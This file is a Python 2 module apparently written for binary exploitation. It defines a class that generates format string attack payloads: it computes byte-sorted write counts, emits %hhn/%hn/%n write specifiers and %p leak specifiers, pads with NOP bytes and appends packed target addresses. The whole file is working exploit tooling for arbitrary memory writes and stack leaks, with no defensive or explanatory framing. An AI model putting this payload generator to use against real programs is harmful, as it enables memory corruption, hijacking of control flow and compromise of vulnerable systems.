# -*- coding: utf-8 -*-

import struct

class fmt:

    def __init__(self, bits = 64, debug = False):
        # default bits is 64
        self.bits = bits
        self.debug = debug

    # pack address
    def pack(self, t, bits = None):
        if (not bits): bits = self.bits

        if bits == 32:
            return struct.pack('<I', t)
        elif bits == 64:
            return struct.pack('<Q', t)

    # unpack address
    def upack(self, t, bits = None):
        if (not bits): bits = self.bits

        if bits == 32:
            return struct.unpack('<I', t)
        elif bits == 64:
            return struct.unpack('<Q', t)


    # parse parameters
    def c_parse(self, t):
        action = 'r'

        try:

            if len(t) < 3:
                return [t[0], t[1], action]
            elif len(t) == 3:
                return [t[0], t[1], action]
            elif len(t) > 3:
                if t[2].strip() == 'w':
                    if len(t) != 4:
                        raise('parameters no enough!')
                    else:
                        return [t[0], t[1], t[2].strip(), t[3]]

        except Exception, e:
            if (self.debug):
                print '[!] error occurred: %s' % str(e)
            return False


    # bytes list sort
    def byt_sort(self, w_addr, part_c):
        # w_addr -> int or hex_str
        # part_c -> int

        pad = None
        if (self.bits == 32): pad = 8
        elif (self.bits == 64): pad = 16

        if type(w_addr) == int: w_addr = hex(w_addr).replace('0x', '').rjust(pad, '0')

        byt_str_lst = []
        byt_lst = []
        byt_remain_lst = []
        idx_lst = []
        c = ( len(w_addr) / 2 )

        # 1 byte in hex use two byts to describe it.
        for i in range(0, len(w_addr), part_c * 2):
            tmp_c = i
            tmp_str = ''
            for j in range(part_c * 2):
                tmp_str += w_addr[tmp_c]
                tmp_c += 1

            byt_str_lst.append(tmp_str)
            byt_lst.append(int(byt_str_lst[-1], 16))
            idx_lst.append(c - part_c)
            c -= part_c

        byt_lst, idx_lst, byt_str_lst = zip(*sorted(zip(byt_lst, idx_lst, byt_str_lst)))

        byt_remain_lst.append(byt_lst[0])

        for i in range(1, len(byt_lst)):
            byt_remain_lst.append(byt_lst[i] - byt_lst[i - 1])

        if (self.debug):
            print '[*] target: %s' % hex(int(w_addr, 16))
            print '[*] sorted byte string: %s' % str(byt_str_lst)
            print '[*] sorted byte: %s' % str(byt_lst)
            print '[*] sorted index: %s' % str(idx_lst)
            print '[*] sorted remain byte: %s' % str(byt_remain_lst)

        return byt_remain_lst, idx_lst


    # create format string attact payload
    def c_payload(self, t, pad = None):
        # [start_idx, [['0x7ffffffff'(int or hex_str), target_addr (int or hex_str), 'w' (w or r), part_count], ['0x12345678', target_addr, 'r']] ]

        # set payload padding length
        if (pad):
            pad = pad
        elif (self.bits == 32):
            # 32-bit; each address is 4 bytes, reserve 4 address
            pad = 4 * 4
        elif (self.bits == 64):
            # 64-bit; each address is 8 bytes, reserve 4 address
            pad = 8 * 4

        
        start_idx = int(t[0])
        if (self.bits == 32):
            start_idx += int(pad) / 4
        elif(self.bits == 64):
            start_idx += int(pad) / 8
        
        payload = ''

        try:

            addr = []

            for p in t[1]:
                para = self.c_parse(p)
                if not para: continue

                w_addr = para[0]
                if type(w_addr) == str: w_addr = int(w_addr, 16)
                t_addr = para[1]
                if type(t_addr) == str: t_addr = int(t_addr, 16)
                action = para[2]
                part_count = None

                # create sorted byte list
                if (action == 'w'):

                    part_count = int(para[3])
                    cnt_lst, idx_lst = self.byt_sort(w_addr, part_count)
                
                    w_unit = None
                    if (part_count == 1):
                        # 1 byte
                        w_unit = 'hhn'
                    elif (part_count == 2):
                        # 2 bytes
                        w_unit = 'hn'
                    elif (part_count == 4):
                        # 4 bytes
                        w_unit = 'n'
                    else: raise ('write unit invalid')
                
                    for i in range(len(idx_lst)):
                        payload += '%%%dc%%%d$%s' % (cnt_lst[i], start_idx, w_unit) 
                        start_idx += 1

                    addr.append([t_addr, idx_lst])

                elif (action == 'r'):
                    payload += '%%%d$p' % (start_idx)
                    start_idx += 1
                    addr.append([t_addr])

            payload = payload.ljust(pad, '\x90')
            
            for p in addr:
                tmp_addr = p[0]
                if (len(p) > 1):
                    for i in p[1]:
                        payload += self.pack(tmp_addr + i)
                        # payload += hex(tmp_addr + i)
                else:
                    payload += self.pack(tmp_addr)
                    # payload += hex(tmp_addr)

            if (self.debug):
                print '[*] create payload: %s' % payload

            return payload
        
            

        except Exception, e:
            if (self.debug): print '[!] error occurred: %s' % str(e)
            return False
